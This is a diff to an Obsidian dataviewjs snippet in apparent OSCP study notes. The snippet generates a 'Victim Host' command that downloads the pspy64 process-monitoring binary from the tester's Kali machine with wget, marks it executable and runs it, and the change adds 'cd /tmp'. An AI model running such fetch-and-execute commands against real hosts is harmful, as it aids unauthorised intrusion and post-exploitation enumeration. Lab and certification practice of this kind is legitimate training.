@@ -12,7 +12,7 @@ On Victim Host
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `wget http://${KaliIP}:80/pspy64 -O pspy && chmod +x pspy && timeout 60s ./pspy`;
+const command = `cd /tmp && wget http://${KaliIP}:80/pspy64 -O pspy && chmod +x pspy && timeout 60s ./pspy`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
